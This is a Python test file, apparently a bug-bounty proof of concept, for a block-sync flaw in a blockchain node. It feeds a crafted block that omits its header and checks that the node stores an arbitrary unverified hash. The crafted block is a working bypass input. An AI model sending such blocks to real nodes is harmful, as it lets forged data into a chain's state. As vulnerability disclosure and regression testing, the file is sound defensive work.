"""
Automated Proof of Concept & Regression Tests for Bounty #58
Cross-Node Consensus & Replication Vulnerabilities (RC-CONS-01, RC-CONS-02)
"""

import json
import os
import sqlite3
import tempfile
import unittest
from node.rustchain_p2p_sync import BlockSync, PeerManager


class TestConsensusVulnerabilities(unittest.TestCase):
    def setUp(self):
        self.test_dir = tempfile.TemporaryDirectory()
        self.db_path = os.path.join(self.test_dir.name, "node_test.db")

        conn = sqlite3.connect(self.db_path)
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE blocks (
                height INTEGER PRIMARY KEY,
                block_hash TEXT NOT NULL,
                prev_hash TEXT NOT NULL,
                timestamp INTEGER NOT NULL,
                merkle_root TEXT NOT NULL,
                state_root TEXT NOT NULL,
                attestations_hash TEXT NOT NULL,
                producer TEXT NOT NULL,
                producer_sig TEXT NOT NULL,
                tx_count INTEGER NOT NULL,
                attestation_count INTEGER NOT NULL,
                body_json TEXT NOT NULL,
                created_at INTEGER NOT NULL
            )
        """)
        # Insert genesis block (height 0)
        cur.execute("""
            INSERT INTO blocks VALUES (
                0, 'genesis_hash_0000000000000000000000000000000000000000000000000000000',
                '0'*64, 1700000000, '0'*64, '0'*64, '0'*64, 'genesis', '', 0, 0, '{}', 1700000000
            )
        """)
        conn.commit()
        conn.close()

        self.peer_mgr = PeerManager(self.db_path, "127.0.0.1", 8088)
        self.block_sync = BlockSync(self.db_path, self.peer_mgr)

    def tearDown(self):
        self.test_dir.cleanup()

    def test_rc_cons_02_omitted_header_bypass(self):
        """
        Demonstrates RC-CONS-02: By omitting data.header, the SHA-256 integrity check
        is bypassed completely and arbitrary unverified hashes are committed.
        """
        malicious_block = {
            "height": 1,
            "hash": "arbitrary_unverified_hash_1111111111111111111111111111111111111",
            "data": {
                "prev_hash": "genesis_hash_0000000000000000000000000000000000000000000000000000000",
                "body": {"payload": "unverified_data"}
            }
        }

        # Apply block
        self.block_sync._apply_blocks([malicious_block])

        # Verify whether block was inserted into DB without valid header
        with sqlite3.connect(self.db_path) as conn:
            row = conn.execute("SELECT height, block_hash FROM blocks WHERE height = 1").fetchone()
            self.assertIsNotNone(row, "Vulnerability RC-CONS-02 confirmed: unhashed block accepted!")
            self.assertEqual(row[1], "arbitrary_unverified_hash_1111111111111111111111111111111111111")


if __name__ == "__main__":
    unittest.main()
